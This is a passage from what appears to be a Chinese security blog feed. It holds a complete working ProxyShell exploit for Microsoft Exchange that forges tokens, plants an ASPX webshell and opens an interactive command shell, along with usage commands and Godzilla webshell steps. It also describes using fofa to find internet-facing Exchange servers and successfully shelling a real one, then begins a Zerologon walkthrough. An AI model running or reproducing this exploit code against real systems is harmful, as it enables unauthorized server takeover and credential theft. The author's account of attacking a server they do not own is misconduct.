f&#39;https:&#x2F;&#x2F;&#123;exchange_url&#125;&#39;</span><br><span class="line">        self.rand_email &#x3D; f&#39;&#123;rand_string()&#125;@&#123;rand_string()&#125;.&#123;rand_string(3)&#125;&#39;</span><br><span class="line">        self.sid &#x3D; None</span><br><span class="line">        self.legacydn &#x3D; None</span><br><span class="line">        self.rand_subj &#x3D; rand_string(16)</span><br><span class="line"></span><br><span class="line">        self.session &#x3D; requests.Session()</span><br><span class="line">        self.session.verify &#x3D; verify</span><br><span class="line">        self.session.headers &#x3D; &#123;</span><br><span class="line">            &#39;Cookie&#39;: f&#39;Email&#x3D;autodiscover&#x2F;autodiscover.json?a&#x3D;&#123;self.rand_email&#125;&#39;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    def post(self, endpoint, data, headers&#x3D;&#123;&#125;):</span><br><span class="line"></span><br><span class="line">        url &#x3D; f&#39;&#123;self.exchange_url&#125;&#x2F;autodiscover&#x2F;autodiscover.json?a&#x3D;&#123;self.rand_email&#125;&#123;endpoint&#125;&#39;</span><br><span class="line">        r &#x3D; self.session.post(</span><br><span class="line">            url&#x3D;url,</span><br><span class="line">            data&#x3D;data,</span><br><span class="line">            headers&#x3D;headers</span><br><span class="line">        )</span><br><span class="line">        return r</span><br><span class="line"></span><br><span class="line">    def get_token(self):</span><br><span class="line"></span><br><span class="line">        self.token &#x3D; self.gen_token()</span><br><span class="line"></span><br><span class="line">    def get_sid(self):</span><br><span class="line"></span><br><span class="line">        data &#x3D; self.legacydn</span><br><span class="line">        data +&#x3D; &#39;\x00\x00\x00\x00\x00\xe4\x04&#39;</span><br><span class="line">        data +&#x3D; &#39;\x00\x00\x09\x04\x00\x00\x09&#39;</span><br><span class="line">        data +&#x3D; &#39;\x04\x00\x00\x00\x00\x00\x00&#39;</span><br><span class="line"></span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &quot;X-Requesttype&quot;: &#39;Connect&#39;,</span><br><span class="line">            &quot;X-Clientinfo&quot;: &#39;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&#39;,</span><br><span class="line">            &quot;X-Clientapplication&quot;: &#39;Outlook&#x2F;15.0.4815.1002&#39;,</span><br><span class="line">            &quot;X-Requestid&quot;: &#39;&#123;C715155F-2BE8-44E0-BD34-2960067874C8&#125;:2&#39;,</span><br><span class="line">            &#39;Content-Type&#39;: &#39;application&#x2F;mapi-http&#39;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r &#x3D; self.post(</span><br><span class="line">            &#39;&#x2F;mapi&#x2F;emsmdb&#39;,</span><br><span class="line">            data,</span><br><span class="line">            headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.sid &#x3D; r.text.split(&quot;with SID &quot;)[1].split(&quot; and MasterAccountSid&quot;)[0]</span><br><span class="line"></span><br><span class="line">    def get_legacydn(self):</span><br><span class="line"></span><br><span class="line">        data &#x3D; self.autodiscover_body()</span><br><span class="line">        headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;&#125;</span><br><span class="line">        r &#x3D; self.post(</span><br><span class="line">            &#39;&#x2F;autodiscover&#x2F;autodiscover.xml&#39;,</span><br><span class="line">            data,</span><br><span class="line">            headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        autodiscover_xml &#x3D; ET.fromstring(r.content)</span><br><span class="line">        self.legacydn &#x3D; autodiscover_xml.find(</span><br><span class="line">            &#39;&#123;*&#125;Response&#x2F;&#123;*&#125;User&#x2F;&#123;*&#125;LegacyDN&#39;</span><br><span class="line">        ).text</span><br><span class="line"></span><br><span class="line">    def autodiscover_body(self):</span><br><span class="line"></span><br><span class="line">        autodiscover &#x3D; ET.Element(</span><br><span class="line">            &#39;Autodiscover&#39;,</span><br><span class="line">            xmlns&#x3D;&#39;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;requestschema&#x2F;2006&#39;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        request &#x3D; ET.SubElement(autodiscover, &#39;Request&#39;)</span><br><span class="line">        ET.SubElement(request, &#39;EMailAddress&#39;).text &#x3D; self.email</span><br><span class="line">        ET.SubElement(request, &#39;AcceptableResponseSchema&#39;).text &#x3D; &#39;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;responseschema&#x2F;2006a&#39;</span><br><span class="line"></span><br><span class="line">        return ET.tostring(</span><br><span class="line">            autodiscover,</span><br><span class="line">            encoding&#x3D;&#39;unicode&#39;,</span><br><span class="line">            method&#x3D;&#39;xml&#39;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    def gen_token(self):</span><br><span class="line"></span><br><span class="line">        # From: https:&#x2F;&#x2F;y4y.space&#x2F;2021&#x2F;08&#x2F;12&#x2F;my-steps-of-reproducing-proxyshell&#x2F;</span><br><span class="line">        version &#x3D; 0</span><br><span class="line">        ttype &#x3D; &#39;Windows&#39;</span><br><span class="line">        compressed &#x3D; 0</span><br><span class="line">        auth_type &#x3D; &#39;Kerberos&#39;</span><br><span class="line">        raw_token &#x3D; b&#39;&#39;</span><br><span class="line">        gsid &#x3D; &#39;S-1-5-32-544&#39;</span><br><span class="line"></span><br><span class="line">        version_data &#x3D; b&#39;V&#39; + (1).to_bytes(1, &#39;little&#39;) + (version).to_bytes(1, &#39;little&#39;)</span><br><span class="line">        type_data &#x3D; b&#39;T&#39; + (len(ttype)).to_bytes(1, &#39;little&#39;) + ttype.encode()</span><br><span class="line">        compress_data &#x3D; b&#39;C&#39; + (compressed).to_bytes(1, &#39;little&#39;)</span><br><span class="line">        auth_data &#x3D; b&#39;A&#39; + (len(auth_type)).to_bytes(1, &#39;little&#39;) + auth_type.encode()</span><br><span class="line">        login_data &#x3D; b&#39;L&#39; + (len(self.email)).to_bytes(1, &#39;little&#39;) + self.email.encode()</span><br><span class="line">        user_data &#x3D; b&#39;U&#39; + (len(self.sid)).to_bytes(1, &#39;little&#39;) + self.sid.encode()</span><br><span class="line">        group_data &#x3D; b&#39;G&#39; + struct.pack(&#39;&lt;II&#39;, 1, 7) + (len(gsid)).to_bytes(1, &#39;little&#39;) + gsid.encode()</span><br><span class="line">        ext_data &#x3D; b&#39;E&#39; + struct.pack(&#39;&gt;I&#39;, 0)</span><br><span class="line"></span><br><span class="line">        raw_token +&#x3D; version_data</span><br><span class="line">        raw_token +&#x3D; type_data</span><br><span class="line">        raw_token +&#x3D; compress_data</span><br><span class="line">        raw_token +&#x3D; auth_data</span><br><span class="line">        raw_token +&#x3D; login_data</span><br><span class="line">        raw_token +&#x3D; user_data</span><br><span class="line">        raw_token +&#x3D; group_data</span><br><span class="line">        raw_token +&#x3D; ext_data</span><br><span class="line"></span><br><span class="line">        data &#x3D; base64.b64encode(raw_token).decode()</span><br><span class="line"></span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rand_string(n&#x3D;5):</span><br><span class="line"></span><br><span class="line">    return &#39;&#39;.join(random.choices(string.ascii_lowercase, k&#x3D;n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit(proxyshell):</span><br><span class="line"></span><br><span class="line">    proxyshell.get_legacydn()</span><br><span class="line">    print(f&#39;LegacyDN: &#123;proxyshell.legacydn&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    proxyshell.get_sid()</span><br><span class="line">    print(f&#39;SID: &#123;proxyshell.sid&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    proxyshell.get_token()</span><br><span class="line">    print(f&#39;Token: &#123;proxyshell.token&#125;&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_server(proxyshell, port):</span><br><span class="line"></span><br><span class="line">    handler &#x3D; partial(PwnServer, proxyshell)</span><br><span class="line">    server &#x3D; ThreadedHTTPServer((&#39;&#39;, port), handler)</span><br><span class="line">    server_thread &#x3D; threading.Thread(target&#x3D;server.serve_forever)</span><br><span class="line">    server_thread.daemon &#x3D; True</span><br><span class="line">    server_thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell(command, port, proxyshell):</span><br><span class="line"></span><br><span class="line">    # From: https:&#x2F;&#x2F;y4y.space&#x2F;2021&#x2F;08&#x2F;12&#x2F;my-steps-of-reproducing-proxyshell&#x2F;</span><br><span class="line">    if command.lower() in [&#39;exit&#39;, &#39;quit&#39;]:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    wsman &#x3D; WSMan(&quot;127.0.0.1&quot;, username&#x3D;&#39;&#39;, password&#x3D;&#39;&#39;, ssl&#x3D;False, port&#x3D;port, auth&#x3D;&#39;basic&#39;, encryption&#x3D;&#39;never&#39;)</span><br><span class="line">    with RunspacePool(wsman, configuration_name&#x3D;&#39;Microsoft.Exchange&#39;) as pool:</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        if command.lower().strip() &#x3D;&#x3D; &#39;dropshell&#39;:</span><br><span class="line">            drop_shell(proxyshell)</span><br><span class="line"></span><br><span class="line">            ps &#x3D; PowerShell(pool)</span><br><span class="line">            ps.add_cmdlet(&#39;New-ManagementRoleAssignment&#39;).add_parameter(&#39;Role&#39;, &#39;Mailbox Import Export&#39;).add_parameter(&#39;User&#39;, proxyshell.email)</span><br><span class="line">            output &#x3D; ps.invoke()</span><br><span class="line">            print(&quot;OUTPUT:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in output]))</span><br><span class="line">            print(&quot;ERROR:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in ps.streams.error]))</span><br><span class="line"></span><br><span class="line">            ps &#x3D; PowerShell(pool)</span><br><span class="line">            ps.add_cmdlet(</span><br><span class="line">                &#39;New-MailboxExportRequest&#39;</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;Mailbox&#39;, proxyshell.email</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;FilePath&#39;, f&#39;\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\&#123;proxyshell.rand_subj&#125;.aspx&#39;</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;IncludeFolders&#39;, &#39;#Drafts#&#39;</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;ContentFilter&#39;, f&#39;Subject -eq \&#39;&#123;proxyshell.rand_subj&#125;\&#39;&#39;</span><br><span class="line">            )</span><br><span class="line">            output &#x3D; ps.invoke()</span><br><span class="line"></span><br><span class="line">            print(&quot;OUTPUT:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in output]))</span><br><span class="line">            print(&quot;ERROR:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in ps.streams.error]))</span><br><span class="line"></span><br><span class="line">            shell_url &#x3D; f&#39;&#123;proxyshell.exchange_url&#125;&#x2F;aspnet_client&#x2F;&#123;proxyshell.rand_subj&#125;.aspx&#39;</span><br><span class="line">            print(f&#39;Shell URL: &#123;shell_url&#125;&#39;)</span><br><span class="line">            for i in range(10):</span><br><span class="line">                print(f&#39;Testing shell &#123;i&#125;&#39;)</span><br><span class="line">                r &#x3D; requests.get(shell_url, verify&#x3D;proxyshell.session.verify)</span><br><span class="line">                if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">                    delimit &#x3D; rand_string()</span><br><span class="line">                    </span><br><span class="line">                    while True:</span><br><span class="line">                        cmd &#x3D; input(&#39;Shell&gt; &#39;)</span><br><span class="line">                        if cmd.lower() in [&#39;exit&#39;, &#39;quit&#39;]:</span><br><span class="line">                            return</span><br><span class="line"></span><br><span class="line">                        exec_code &#x3D; f&#39;Response.Write(&quot;&#123;delimit&#125;&quot; + new ActiveXObject(&quot;WScript.Shell&quot;).Exec(&quot;cmd.exe &#x2F;c &#123;cmd&#125;&quot;).StdOut.ReadAll() + &quot;&#123;delimit&#125;&quot;);&#39;</span><br><span class="line">                        r &#x3D; requests.get(</span><br><span class="line">                            shell_url,</span><br><span class="line">                            params&#x3D;&#123;</span><br><span class="line">                                &#39;exec_code&#39;:exec_code</span><br><span class="line">                            &#125;,</span><br><span class="line">                            verify&#x3D;proxyshell.session.verify</span><br><span class="line">                        )</span><br><span class="line">                        output &#x3D; r.content.split(delimit.encode())[1]</span><br><span class="line">                        print(output.decode())</span><br><span class="line"></span><br><span class="line">                time.sleep(5)</span><br><span class="line">                i +&#x3D; 1</span><br><span class="line"></span><br><span class="line">            print(&#39;Shell drop failed :(&#39;)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            ps &#x3D; PowerShell(pool)</span><br><span class="line">            ps.add_script(command)</span><br><span class="line">            output &#x3D; ps.invoke()</span><br><span class="line"></span><br><span class="line">    print(&quot;OUTPUT:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in output]))</span><br><span class="line">    print(&quot;ERROR:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in ps.streams.error]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line"></span><br><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;ProxyShell example&#39;)</span><br><span class="line">    parser.add_argument(&#39;-u&#39;, help&#x3D;&#39;Exchange URL&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;-e&#39;, help&#x3D;&#39;Email address&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;-p&#39;, help&#x3D;&#39;Local wsman port&#39;, default&#x3D;8000, type&#x3D;int)</span><br><span class="line">    return parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def drop_shell(proxyshell):</span><br><span class="line"></span><br><span class="line">    data &#x3D; f&quot;&quot;&quot;</span><br><span class="line">    &lt;soap:Envelope</span><br><span class="line">  xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">  xmlns:m&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;services&#x2F;2006&#x2F;messages&quot;</span><br><span class="line">  xmlns:t&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;services&#x2F;2006&#x2F;types&quot;</span><br><span class="line">  xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">  &lt;soap:Header&gt;</span><br><span class="line">    &lt;t:RequestServerVersion Version&#x3D;&quot;Exchange2016&quot; &#x2F;&gt;</span><br><span class="line">    &lt;t:SerializedSecurityContext&gt;</span><br><span class="line">      &lt;t:UserSid&gt;&#123;proxyshell.sid&#125;&lt;&#x2F;t:UserSid&gt;</span><br><span class="line">      &lt;t:GroupSids&gt;</span><br><span class="line">        &lt;t:GroupIdentifier&gt;</span><br><span class="line">          &lt;t:SecurityIdentifier&gt;S-1-5-21&lt;&#x2F;t:SecurityIdentifier&gt;</span><br><span class="line">        &lt;&#x2F;t:GroupIdentifier&gt;</span><br><span class="line">      &lt;&#x2F;t:GroupSids&gt;</span><br><span class="line">    &lt;&#x2F;t:SerializedSecurityContext&gt;</span><br><span class="line">  &lt;&#x2F;soap:Header&gt;</span><br><span class="line">  &lt;soap:Body&gt;</span><br><span class="line">    &lt;m:CreateItem MessageDisposition&#x3D;&quot;SaveOnly&quot;&gt;</span><br><span class="line">      &lt;m:Items&gt;</span><br><span class="line">        &lt;t:Message&gt;</span><br><span class="line">          &lt;t:Subject&gt;&#123;proxyshell.rand_subj&#125;&lt;&#x2F;t:Subject&gt;</span><br><span class="line">          &lt;t:Body BodyType&#x3D;&quot;HTML&quot;&gt;hello from darkness side&lt;&#x2F;t:Body&gt;</span><br><span class="line">          &lt;t:Attachments&gt;</span><br><span class="line">            &lt;t:FileAttachment&gt;</span><br><span class="line">              &lt;t:Name&gt;FileAttachment.txt&lt;&#x2F;t:Name&gt;</span><br><span class="line">              &lt;t:IsInline&gt;false&lt;&#x2F;t:IsInline&gt;</span><br><span class="line">              &lt;t:IsContactPhoto&gt;false&lt;&#x2F;t:IsContactPhoto&gt;</span><br><span class="line">              &lt;t:Content&gt;ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT&#x2F;gtbahqXahoI5uanf2jmp1mlU041pqRT&#x2F;FIb32tld9wZUFLfTBjm5qd&#x2F;aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ&lt;&#x2F;t:Content&gt;</span><br><span class="line">            &lt;&#x2F;t:FileAttachment&gt;</span><br><span class="line">          &lt;&#x2F;t:Attachments&gt;</span><br><span class="line">          &lt;t:ToRecipients&gt;</span><br><span class="line">            &lt;t:Mailbox&gt;</span><br><span class="line">              &lt;t:EmailAddress&gt;&#123;proxyshell.email&#125;&lt;&#x2F;t:EmailAddress&gt;</span><br><span class="line">            &lt;&#x2F;t:Mailbox&gt;</span><br><span class="line">          &lt;&#x2F;t:ToRecipients&gt;</span><br><span class="line">        &lt;&#x2F;t:Message&gt;</span><br><span class="line">      &lt;&#x2F;m:Items&gt;</span><br><span class="line">    &lt;&#x2F;m:CreateItem&gt;</span><br><span class="line">  &lt;&#x2F;soap:Body&gt;</span><br><span class="line">&lt;&#x2F;soap:Envelope&gt;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r &#x3D; proxyshell.post(</span><br><span class="line">        f&#39;&#x2F;EWS&#x2F;exchange.asmx&#x2F;?X-Rps-CAT&#x3D;&#123;proxyshell.token&#125;&#39;,</span><br><span class="line">        data&#x3D;data,</span><br><span class="line">        headers&#x3D;headers</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    args &#x3D; get_args()</span><br><span class="line">    exchange_url &#x3D; args.u</span><br><span class="line">    email &#x3D; args.e</span><br><span class="line">    local_port &#x3D; args.p</span><br><span class="line"></span><br><span class="line">    proxyshell &#x3D; ProxyShell(</span><br><span class="line">        exchange_url,</span><br><span class="line">        email</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    exploit(proxyshell)</span><br><span class="line">    start_server(proxyshell, local_port)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        shell(input(&#39;PS&gt; &#39;), local_port, proxyshell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    requests.packages.urllib3.disable_warnings(</span><br><span class="line">        requests.packages.urllib3.exceptions.InsecureRequestWarning</span><br><span class="line">    )</span><br><span class="line">    if not (sys.version_info.major &#x3D;&#x3D; 3 and sys.version_info.minor &gt;&#x3D; 8):</span><br><span class="line">        print(&quot;This script requires Python 3.8 or higher!&quot;)</span><br><span class="line">        print(&quot;You are using Python &#123;&#125;.&#123;&#125;.&quot;.format(sys.version_info.major, sys.version_info.minor))</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>上传webshell命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\proxyshell_rce.py -u https:&#x2F;&#x2F;192.168.0.112&#x2F; -e Administrator@the.dog -p 9999</span><br><span class="line">Get-MailboxExportRequest</span><br><span class="line">Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false</span><br><span class="line">dropshell</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829041302748.png" alt="image-20210829041302748"></p>
<p>但是这种方式，server2016自带就能查杀</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829041416391.png" alt="image-20210829041416391"></p>
<p>不过多试一两次就不会杀了</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829043505815.png" alt="image-20210829043505815"></p>
<h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>然后proxyshell_rce.py自带的也可以执行命令，所以可以直接运行该脚本执行上传webshell命令，生成的马无需密码，是在url中直接执行命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;192.168.0.112&#x2F;&#x2F;aspnet_client&#x2F;kihgktmlgwhecpqw.aspx?exec_code&#x3D;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).Exec(&quot;cmd.exe &#x2F;c whoami&quot;).StdOut.ReadAll());</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829044125311.png" alt="image-20210829044125311"></p>
<h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h2><p>最后就是哥斯拉下CSHAP_AES_BASE64加密方式需要修改才能用的马</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829044625870.png" alt="image-20210829044625870"></p>
<p>然后要把马中的Session字符替换成Application</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829044812957.png" alt="image-20210829044812957"></p>
<p>然后替换proxyshell_payload.py中的webshell部分，webshell参数也要由双引号变成单引号</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045047466.png" alt="image-20210829045047466"></p>
<p>运行得到加密后的webshell</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045122915.png" alt="image-20210829045122915"></p>
<p>替换proxyshell_rce.py的&lt;/t:Content/&gt;字段中</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045316799.png" alt="image-20210829045316799"></p>
<p>运行getshell</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045532320.png" alt="image-20210829045532320"></p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045557493.png" alt="image-20210829045557493"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>然后fofa上搜了下exchange的资产测试，成功率还挺高，第二个就成了。点开Certificate可以看到邮箱后缀</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045756500.png" alt="image-20210829045756500"></p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045956641.png" alt="image-20210829045956641"></p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050053723.png" alt="image-20210829050053723"></p>
<p>前面这些步骤输出和在本地测试的时候输出并不一样，当时以为没成功，可到最后一步dropshell的时候还是成功写进去了shell</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050303757.png" alt="image-20210829050303757"></p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050343502.png" alt="image-20210829050343502"></p>
<p>但是在8月26号就已经有人在这个目录下种马了</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050529516.png" alt="image-20210829050529516"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本地测试时是在server2016上搭建的exchange2016，搭建完成后提示要重启，然后在没改任何配置的情况下，第一次重启后浏览器访问exchange提示无法工作，然后再重启一次就可以正常访问了。测试漏洞时，第一次和第二次都没利用成功，第三次写webshell被查杀，第四次成功写进去。fofa上找资产测试时前几步输出和本地测试时输出不一样，以为失败了，可最后成功写进去了。所以建议测试这个漏洞时多尝试几次。</span><br><span class="line"></span><br><span class="line">另外利用这个漏洞会自动在邮箱中生成草稿，草稿中的内容就是webshell的名字。</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829051545195.png" alt="image-20210829051545195"></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2020-1472域内提权漏洞</title>
    <url>/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CVE-2020-1472是微软八月修复的一个严重的权限提升漏洞(并于昨天2020年9月15日secura发布了相关的漏洞细节，随后相关exp被构造发布)，通过Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接安全通道时，存在特权提升的利用点，该漏洞的CVSS分高达10分，攻击者只需要在内网中有一个立足点，就可以远程获取域控的管理员权限。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>

<h1 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.通过漏洞脚本置空域控保存在AD中的密码</span><br><span class="line">2.通过secretsdump.py获取域控上的用户hash</span><br><span class="line">3.通过该hash使用wmiexec.py登录域控获取一个shell</span><br><span class="line">4.通过shell获取本地保存的原hash key</span><br><span class="line">5.通过获取的hash key恢复置空的域控密码</span><br></pre></td></tr></table></figure>

<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p> 利用脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dirkjanm&#x2F;CVE-2020-1472	#域控保存在AD的密码置空，对域控有影响，要及时恢复</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;risksense&#x2F;zerologon		#恢复脚本</span><br></pre></td></tr></table></figure>

<p>除了上述脚本之外，还要用到python3下impacket模块中的secretsdump.py和wmiexec.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py	#置空域控hash后，获取其他用户hash</span><br><span class="line">wmiexec.py	#用获得的用户hash登录上去，获得一个shell</span><br></pre></td></tr></table></figure>

<p>这里对版本有要求，python3.7以上，impacket版本v0.9.22.dev1以上</p>
<p>我实验的时候用的kali做攻击机，impacket模块中两个脚本的路径是<kbd>/usr/share/doc/python3-impacket/examples</kbd>，要查看版本随便运行一个文件就可以看到</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127111729607.png" alt="image-20210127111729607"></p>
<p>新版impacket包下载地址<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>下载后进入目录运行<kbd>sudo pip3 install .</kbd>即可安装新版impacket模块。如果没有pip3，按照以下方法安装pip3。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py</span><br><span class="line">python3 get-pip.py</span><br><span class="line">pip3 -V </span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127112246983.png" alt="image-20210127112246983"></p>
<p>都准备就绪后就可以开始实验了，环境如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击机kali	192.168.154.128</span><br><span class="line">边界机win7	192.168.154.130	192.168.52.143</span><br><span class="line">域控server08	192.168.52.138</span><br></pre></td></tr></table></figure>

<p>kali作为cs服务端，获取边界机的会话后设置代理24446端口</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113026628.png" alt="image-20210127113026628"></p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113108084.png" alt="image-20210127113108084"></p>
<p>配置代理后，kali就可以访问域控了。OWA是域控主机名，可通过cs端口扫描到。也可在system权限下通过命令查找域控信息。</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113652512.png" alt="image-20210127113652512"></p>
